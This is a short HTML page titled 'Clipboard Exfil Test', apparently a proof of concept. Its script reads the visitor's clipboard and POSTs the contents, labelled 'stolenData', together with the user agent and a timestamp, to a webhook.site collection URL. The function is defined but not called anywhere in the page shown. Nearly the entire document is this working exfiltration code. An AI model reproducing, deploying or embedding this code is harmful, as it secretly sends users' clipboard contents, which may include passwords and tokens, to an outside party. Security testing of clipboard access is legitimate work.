<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Clipboard Exfil Test</title>
</head>
<body>
  <h1>🚨 Clipboard Exfil Test</h1>

  <pre id="output"></pre>

  <script>
    async function exfiltrate() {
      const output = document.getElementById('output');
      try {
        const data = await navigator.clipboard.readText();
        output.textContent = `📋 Clipboard:\n${data}`;

        const body = {
          stolenData: data,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        };

        const res = await fetch("https://webhook.site/ed442c85-933a-4da3-987c-14d277c4d8e1", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(body)
        });

        output.textContent += `\n\n✅ Sent to Webhook.site.\nStatus: ${res.status}`;
      } catch (err) {
        output.textContent += `\n\n❌ Error: ${err}`;
      }
    }
  </script>
</body>
</html>
